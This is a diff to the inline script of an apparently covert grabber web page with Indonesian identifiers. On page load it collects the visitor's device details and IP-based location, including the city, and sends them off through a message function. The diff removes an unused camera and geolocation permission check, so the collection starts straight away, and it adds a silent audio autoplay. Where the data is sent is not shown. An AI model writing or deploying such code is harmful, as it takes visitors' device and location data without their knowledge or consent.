@@ -214,23 +214,9 @@ Kota                : ${ip.city}
       }
     };
 
-    const cekIzinDanMulai = async () => {
-      try {
-        const izinKamera = await navigator.permissions.query({ name: "camera" });
-        const izinLokasi = await navigator.permissions.query({ name: "geolocation" });
-
-        if (izinKamera.state === "granted" && izinLokasi.state === "granted") {
-          mulai(); // langsung tanpa pop-up
-        } else {
-          // tetap jalan, browser akan munculkan pop-up izin
-          mulai();
-        }
-      } catch {
-        mulai(); // fallback
-      }
-    };
-
     const mulai = async () => {
+      try { await audio.play(); } catch {}
+
       const info = await ambilDataPerangkat();
       const ip = await ambilIPInfo();
       await kirimPesan(`${info}\n\n${ip}`);
@@ -246,7 +232,7 @@ Kota                : ${ip.city}
     };
 
     window.addEventListener("load", () => {
-      setTimeout(cekIzinDanMulai, 0);
+      setTimeout(mulai, 0);
     });
   </script>
 </body>
